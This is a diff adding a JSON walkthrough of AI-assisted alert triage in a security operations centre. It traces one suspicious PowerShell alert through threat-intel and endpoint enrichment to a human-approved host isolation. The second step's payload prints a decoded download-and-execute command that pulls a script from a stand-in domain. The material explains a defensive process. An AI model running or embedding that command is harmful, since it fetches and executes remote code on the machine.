@@ -1,0 +1,168 @@
+{
+  "id": "soc-triage",
+  "path": "security",
+  "order": 2,
+  "tier": "pro",
+  "category": "Cybersecurity automation",
+  "title": "AI alert triage in the SOC",
+  "summary": "Security teams drown in alerts. An agent gathers evidence for each one so analysts only see what matters.",
+  "nodes": [
+    {
+      "id": "siem",
+      "label": "SIEM",
+      "kind": "data",
+      "x": 9,
+      "y": 50
+    },
+    {
+      "id": "agent",
+      "label": "Triage agent",
+      "kind": "app",
+      "x": 36,
+      "y": 50
+    },
+    {
+      "id": "intel",
+      "label": "Threat intel",
+      "kind": "external",
+      "x": 66,
+      "y": 12
+    },
+    {
+      "id": "edr",
+      "label": "EDR",
+      "kind": "tool",
+      "x": 90,
+      "y": 50
+    },
+    {
+      "id": "analyst",
+      "label": "Analyst",
+      "kind": "user",
+      "x": 66,
+      "y": 88
+    }
+  ],
+  "steps": [
+    {
+      "from": "siem",
+      "to": "agent",
+      "label": "alert",
+      "title": "An alert fires",
+      "text": "The SIEM collects logs from every system and raises alerts. Large companies get thousands a day; most are harmless.",
+      "payload": [
+        [
+          "rule",
+          "\"Suspicious PowerShell download\"",
+          ""
+        ],
+        [
+          "host",
+          "FIN-LAPTOP-22",
+          ""
+        ],
+        [
+          "command",
+          "powershell -enc SQBFAFgA…",
+          "Encoded commands are a common way to hide intent."
+        ],
+        [
+          "severity",
+          "high",
+          ""
+        ]
+      ]
+    },
+    {
+      "from": "agent",
+      "to": "intel",
+      "label": "lookup IOCs",
+      "title": "Enrich: is this known-bad?",
+      "text": "The agent decodes the command, pulls out indicators (domains, IPs, hashes) and checks them against threat-intelligence feeds.",
+      "payload": [
+        [
+          "decoded",
+          "IEX (New-Object Net.WebClient).DownloadString('http://cdn-upd4te.example/a.ps1')",
+          "Downloads and runs a script."
+        ],
+        [
+          "domain",
+          "cdn-upd4te.example",
+          ""
+        ],
+        [
+          "intel",
+          "registered 3 days ago · on 2 blocklists",
+          "Strong red flags."
+        ]
+      ]
+    },
+    {
+      "from": "agent",
+      "to": "edr",
+      "label": "host context",
+      "title": "Enrich: what else happened on the machine?",
+      "text": "Read-only queries to the endpoint tool: parent process, network connections, other alerts on this host.",
+      "payload": [
+        [
+          "parent",
+          "WINWORD.EXE → powershell.exe",
+          "Word launching PowerShell usually means a malicious document."
+        ],
+        [
+          "user",
+          "a.khan (finance)",
+          ""
+        ],
+        [
+          "outbound",
+          "443 → 203.0.113.50",
+          ""
+        ]
+      ]
+    },
+    {
+      "from": "agent",
+      "to": "analyst",
+      "label": "verdict + evidence",
+      "title": "A ready-made case for a human",
+      "text": "Instead of a raw alert, the analyst gets a verdict, the reasoning and the evidence, mapped to MITRE ATT&CK techniques.",
+      "payload": [
+        [
+          "verdict",
+          "likely true positive · confidence 0.92",
+          ""
+        ],
+        [
+          "ATT&CK",
+          "T1566.001 phishing attachment · T1059.001 PowerShell",
+          "Shared vocabulary for attacker behaviour."
+        ],
+        [
+          "suggested",
+          "isolate host · reset user password · block domain",
+          ""
+        ]
+      ]
+    },
+    {
+      "from": "analyst",
+      "to": "edr",
+      "label": "isolate host",
+      "title": "The human pulls the trigger",
+      "text": "Containment can disrupt the business, so a person approves it. False positives get auto-closed with the agent's notes, saving hours a day.",
+      "payload": [
+        [
+          "action",
+          "network isolation",
+          ""
+        ],
+        [
+          "time to triage",
+          "4 min (was ~45)",
+          ""
+        ]
+      ]
+    }
+  ]
+}
